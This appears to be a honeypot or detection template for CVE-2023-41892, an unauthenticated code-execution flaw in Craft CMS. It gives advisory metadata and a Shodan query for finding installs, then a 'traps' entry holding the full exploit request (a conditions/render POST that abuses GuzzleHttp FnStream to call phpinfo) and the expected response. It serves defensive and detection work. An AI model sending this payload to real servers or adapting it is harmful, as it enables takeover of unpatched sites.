id: CVE-2023-41892
info:
  name: CraftCMS < 4.4.15 - Unauthenticated Remote Code Execution
  author: iamnoooob,rootxharsh,pdresearch
  description: Craft CMS is a platform for creating digital experiences. This is a
    high-impact, low-complexity attack vector leading to Remote Code Execution (RCE).
    Users running Craft installations before 4.4.15 are encouraged to update to at
    least that version to mitigate the issue. This issue has been fixed in Craft CMS
    4.4.15.
  severity: critical
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the target system.

    '
  reference:
  - https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g
  - https://blog.calif.io/p/craftcms-rce
  - https://github.com/craftcms/cms/blob/develop/CHANGELOG.md#4415---2023-07-03-critical
  - https://github.com/craftcms/cms/commit/7359d18d46389ffac86c2af1e0cd59e37c298857
  - https://github.com/craftcms/cms/commit/a270b928f3d34ad3bd953b81c304424edd57355e
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-41892
    cwe-id: CWE-94
    epss-score: 0.87963
    epss-percentile: 0.98425
    cpe: cpe:2.3:a:craftcms:craft_cms:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: craftcms
    product: craft_cms
    shodan-query: http.favicon.hash:-47932290
    publicwww-query: craftcms
  tags: cve2023,cve,rce,unauth,craftcms
traps:
- request:
    method: POST
    path: /index.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as
      xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}

      '
  response:
    status_code: 200
    headers: {}
    body: PHP CreditsPHP GroupCraftCMS
